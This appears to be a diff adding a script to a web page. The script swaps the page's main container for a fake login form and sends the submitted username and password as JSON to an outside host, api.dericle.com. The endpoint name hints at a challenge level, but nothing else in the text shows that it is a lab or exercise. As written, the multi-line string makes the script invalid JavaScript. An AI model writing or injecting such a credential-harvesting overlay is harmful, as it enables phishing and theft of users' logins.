@@ -1,0 +1,39 @@
+<script>
+      function replaceContent() {
+        var elements = document.getElementsByClassName('maincontainer');
+        
+        if (elements.length > 0) {
+          elements[0].innerHTML = '<form id="login-form" action="/submit-login" method="post">
+            <h2>Login</h2>
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="username" required>
+            <br>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required>
+            <br>
+            <button type="submit">Login</button>
+          </form>';   
+
+          document.getElementById('login-form').addEventListener('submit', function(event) {
+              event.preventDefault();
+              var formData = new FormData(this);
+              var formObject = {};
+                  formData.forEach((value, key) => {
+                      formObject[key] = value;
+                  });
+              var json = JSON.stringify(formObject);
+
+              fetch('https://api.dericle.com/check_lvl1', {
+                  method: 'POST',
+                  headers: {'Content-Type': 'application/json'},  
+                  body: json
+              })
+              .catch((error) => {
+                  console.error('Error:', error);
+              });
+          });
+        }
+      }
+
+      replaceContent();
+</script>
